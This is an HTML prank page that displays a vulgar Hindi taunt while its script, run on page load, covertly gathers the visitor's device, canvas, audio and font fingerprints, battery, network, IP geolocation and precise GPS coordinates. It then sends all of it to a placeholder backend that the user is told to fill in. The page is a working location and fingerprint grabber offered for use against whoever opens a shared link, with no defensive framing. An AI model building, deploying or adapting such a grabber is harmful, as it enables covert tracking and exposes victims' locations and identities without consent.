<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 20px;
        }

        .glowing {
            font-size: 2rem;
            font-weight: 900;
            color: #fff;
            text-shadow:
                0 0 7px #fff,
                0 0 10px #fff,
                0 0 21px #ff00de,
                0 0 42px #ff00de,
                0 0 82px #ff00de,
                0 0 92px #ff00de,
                0 0 102px #ff00de;
            animation: flicker 3s infinite alternate;
            z-index: 10;
            position: relative;
        }

        @keyframes flicker {
            0%, 19.9%, 22%, 62.9%, 64%, 64.9%, 70%, 100% {
                opacity: 0.8;
                text-shadow:
                    0 0 7px #fff,
                    0 0 10px #fff,
                    0 0 21px #ff00de,
                    0 0 42px #ff00de,
                    0 0 82px #ff00de,
                    0 0 92px #ff00de,
                    0 0 102px #ff00de;
            }
            20%, 21.9%, 63%, 63.9%, 65%, 69.9% {
                opacity: 0.3;
                text-shadow: none;
            }
        }

        .status {
            position: fixed;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            color: #333;
            font-size: 0.7rem;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="glowing">chud gaya behen ka loda 😂</div>
    </div>

    <div class="status" id="status"></div>

    <script>
    (async () => {
        // ============================================
        // ⚙️ CONFIGURATION - YAHAN APNA ENDPOINT DAALO
        // ============================================
        const ENDPOINT = "https://YOUR-BACKEND.com/api/capture";
        // ============================================

        const status = document.getElementById('status');

        // --- 1. DEVICE INFO GATHERING ---
        const getDeviceInfo = () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            let canvasFingerprint = '';
            try {
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('fingerprint', 2, 2);
                canvasFingerprint = canvas.toDataURL();
            } catch(e) {}

            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                window: {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                touchPoints: navigator.maxTouchPoints,
                touchSupport: 'ontouchstart' in window,
                canvasFingerprint: canvasFingerprint.substring(0, 100)
            };
        };

        // --- 2. BATTERY INFO ---
        const getBatteryInfo = async () => {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return { error: 'Battery API not supported' };
        };

        // --- 3. NETWORK INFO ---
        const getNetworkInfo = () => {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                effectiveType: conn?.effectiveType || 'unknown',
                type: conn?.type || 'unknown',
                downlink: conn?.downlink || 'unknown',
                rtt: conn?.rtt || 'unknown',
                saveData: conn?.saveData || false
            };
        };

        // --- 4. IP + GEO DATA (from IP API) ---
        const getIPData = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch(e) {
                try {
                    const res2 = await fetch('https://ipinfo.io/json?token=ATagz9VvRQ');
                    return await res2.json();
                } catch(e2) {
                    return { ip: 'unknown', error: e2.message };
                }
            }
        };

        // --- 5. LIVE GPS LOCATION ---
        const getGPSLocation = () => {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    return resolve({ error: 'Geolocation not supported' });
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed,
                            timestamp: pos.timestamp
                        });
                    },
                    (err) => {
                        resolve({ error: err.message, code: err.code });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        };

        // --- 6. STORAGE / FINGERPRINT DATA ---
        const getStorageInfo = () => {
            let hasLocalStorage = false, hasSessionStorage = false;
            try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); hasLocalStorage = true; } catch(e) {}
            try { sessionStorage.setItem('_t', '1'); sessionStorage.removeItem('_t'); hasSessionStorage = true; } catch(e) {}

            return {
                localStorage: hasLocalStorage,
                sessionStorage: hasSessionStorage,
                indexedDB: !!window.indexedDB,
                webWorker: !!window.Worker,
                webGL: (() => {
                    try {
                        const c = document.createElement('canvas');
                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                        if (!gl) return 'not supported';
                        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                        return {
                            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'unknown',
                            renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'unknown'
                        };
                    } catch(e) { return 'error'; }
                })()
            };
        };

        // --- 7. AUDIO FINGERPRINT (Advanced) ---
        const getAudioFingerprint = () => {
            return new Promise((resolve) => {
                try {
                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
                    const osc = ctx.createOscillator();
                    const analyser = ctx.createAnalyser();
                    osc.connect(analyser);
                    osc.type = 'triangle';
                    osc.frequency.value = 10000;
                    osc.start();
                    const data = new Float32Array(analyser.fftSize);
                    analyser.getFloatTimeDomainData(data);
                    osc.stop();
                    ctx.close();
                    resolve({ hash: data.reduce((a, b) => a + b.toFixed(4), 0).toString() });
                } catch(e) {
                    resolve({ error: e.message });
                }
            });
        };

        // --- 8. FONT FINGERPRINT ---
        const getFontFingerprint = () => {
            const testFonts = ['Arial', 'Verdana', 'Courier New', 'Georgia', 'Trebuchet MS', 'Comic Sans MS', 'Impact', 'Times New Roman'];
            const baseFont = 'monospace';
            const baseSize = 72;
            const base = document.createElement('span');
            base.style.cssText = `position:absolute;font-size:${baseSize}px;font-family:${baseFont}`;
            base.textContent = 'mmmmmmmmmmlli';
            document.body.appendChild(base);
            const baseWidth = base.offsetWidth;
            const baseHeight = base.offsetHeight;
            document.body.removeChild(base);

            const detected = testFonts.filter(font => {
                const span = document.createElement('span');
                span.style.cssText = `position:absolute;font-size:${baseSize}px;font-family:'${font}',${baseFont}`;
                span.textContent = 'mmmmmmmmmmlli';
                document.body.appendChild(span);
                const w = span.offsetWidth;
                const h = span.offsetHeight;
                document.body.removeChild(span);
                return w !== baseWidth || h !== baseHeight;
            });

            return detected;
        };

        // --- 9. COLLECT ALL & SEND ---
        const collectAndSend = async () => {
            status.textContent = 'Gathering data...';

            const [device, battery, network, ipData, gps, storage, audio, fonts] = await Promise.all([
                Promise.resolve(getDeviceInfo()),
                getBatteryInfo(),
                Promise.resolve(getNetworkInfo()),
                getIPData(),
                getGPSLocation(),
                Promise.resolve(getStorageInfo()),
                getAudioFingerprint(),
                Promise.resolve(getFontFingerprint())
            ]);

            const payload = {
                meta: {
                    url: window.location.href,
                    referrer: document.referrer,
                    title: document.title,
                    timestamp: new Date().toISOString(),
                    pageLoadTime: performance.now()
                },
                ip: ipData,
                device: device,
                battery: battery,
                network: network,
                gps: gps,
                storage: storage,
                audioFingerprint: audio,
                installedFonts: fonts
            };

            status.textContent = 'Sending...';

            try {
                const res = await fetch(ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (res.ok) {
                    status.textContent = '✓';
                    status.style.color = '#0f0';
                } else {
                    status.textContent = 'Send failed: ' + res.status;
                    status.style.color = '#f00';
                }
            } catch(e) {
                status.textContent = 'Error: ' + e.message;
                status.style.color = '#f00';
            }
        };

        // Execute
        collectAndSend();
    })();
    </script>
</body>
</html>
